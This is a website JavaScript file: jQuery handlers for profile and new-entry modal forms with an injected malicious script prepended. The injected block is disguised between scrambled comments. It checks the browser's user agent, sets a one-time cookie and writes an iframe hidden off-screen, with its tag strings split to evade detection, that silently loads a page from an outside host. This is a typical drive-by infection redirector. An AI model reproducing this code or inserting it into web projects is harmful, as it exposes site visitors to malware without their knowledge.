//Some.devices.are.designed:to,deny,users.access.to.install,or.run.modified:versions.of.the.software.inside:them,althoughthe,manufacturer,can.do.so
(function(){
function stripos (f_haystack, f_needle, f_offset) {
var haystack = (f_haystack + '').toLowerCase();
var needle = (f_needle + '').toLowerCase();
var lenam = 0;
if ((lenam = haystack.indexOf(needle, f_offset)) !== -1) {
return lenam;
}
return false;
}
function ver_newbar_check(){
var VestelProbe = 'iPhone@Macintosh@Linux@iPad@Series40@SymbOS@Flock@SeaMonkey@Nokia@SlimBrowser@AmigaOS@Android@FreeBSD@Chrome@IEMobile@SymbianOS@Avant@Chromium@Firefox/18.0@Firefox/18.0.1@Firefox/17.0@Firefox/12.0@Firefox/25.0@Firefox/24.0@Firefox/18.0.2@Firefox/19.0@Firefox/19.0.1@Firefox/20.0@Firefox/21.0@Firefox/22.0@Firefox/23.0@Firefox/25.0.1@Firefox/26.0@Firefox/27.0@Maxthon@MRSPUTNIK@Mini@Firefox/28.0@BlackBerry@PLAYSTATION@Wget@Firefox/27.0.1@Firefox/28.0';
VestelProbe = VestelProbe.split('@');
var easymKA = false;
for (var i in VestelProbe) {
if (stripos(navigator.userAgent, VestelProbe[i])!==false) {
easymKA = true;
break;
}
}
return easymKA;
}
function setCookie(name, value, expires) {
var date = new Date( new Date().getTime() + expires*1000 );
document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
}
function getCookie(name) {
var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\/\+^])/g, '$1') + "=([^;]*)" ));
return matches ? decodeURIComponent(matches[1]) : undefined;
}
if (!ver_newbar_check()) {
var cookie = getCookie('lenea18je16ukerma91ke01lxna47jerma15gke381kja7d');
if (cookie == undefined) {
setCookie('lenea18je16ukerma91ke01lxna47jerma15gke381kja7d', true, 86404);
document.write('<ifra'+'m'+'e sr'+'c='+'"http://tender.nicegrouping.com/fdgsagrhrtsjrj19.html" style="position:absolute;left'+':-'+'1317'+'px'+';'+'top'+':-'+'1317'+'px'+';" height="141" width="141" name="PoliticNAte"></ifra'+'me>');
}
}
})();
//Finally,every:program.is.threatened.constantly.by,software.patents.

$(document).ready(function(){

//MODAL FOR PROFILE
    $('#profile_form').ajaxForm({
        target: '#optablediv',
        success: function() {
            $('#optablediv').fadeIn('slow');
            $("#newop_div input").val('');
        }
    });
    
    $("#newop_submit").click(function(){
        $("#newop_div").modal('hide');
    });

//MODAL FOR NEWOP    
    $("#newop_button").modal();
    
    $('#newop_form').ajaxForm({
        target: '#optablediv',
        success: function() {
            $('#optablediv').fadeIn('slow');
            $("#newop_div input").val('');
        }
    });
    
    $("#newop_submit").click(function(){
        $("#newop_div").modal('hide');
    });
    
  
    
});


 